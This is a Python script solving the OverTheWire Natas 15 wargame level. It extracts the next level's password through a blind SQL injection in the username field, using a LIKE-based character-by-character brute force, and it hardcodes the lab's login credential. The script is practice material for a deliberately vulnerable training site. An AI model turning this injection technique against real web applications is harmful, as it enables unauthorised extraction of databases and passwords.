# -*- coding: utf-8 -*-
"""
Created on Mon Oct 30 14:19:35 2023

OverTheWire: Natas 15 ~ Abusing SQL's LIKE operator with bruteforce

@author: DjentMachine
"""

import requests
from bs4 import BeautifulSoup 
import re

#Characters to loop through 
charList = [chr(i) for i in range(32, 126)]

#POST request data
user='natas15'
password='TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url="http://natas15.natas.labs.overthewire.org/"


"""
Function for looping through each character of a list
string -> password found so far. Starts with an empty string
characters -> list of characters to test 
"""
def getALetter(string, characters):
    for i in characters:
        if(i in ['"',"'",'#','%', '_']):
            i='\\'+i
        data={"username":"natas16\" AND BINARY password like \"%s\" #" %(string+i+'%')}
        myPost = requests.post(url,
                           auth=requests.auth.HTTPBasicAuth(user, password),
                           data=data)
        soup = BeautifulSoup(myPost.content, 'html5lib')
        a=soup.find('div', attrs={'id':'content'})
        b=re.split(r'<br|\n', str(a))[1]
        
        #len=24 is the length of "This user doens't exist.", the rejection message from the server 
        if(len(b) !=24):
            print(b + " -> " + i)
            return i
    return False
    

finalPass=""
while True:
    letter=getALetter(finalPass, charList)
    if letter:
        finalPass+=letter
    else:
        print("\nPassword -----> " + finalPass)     
        break



    
    







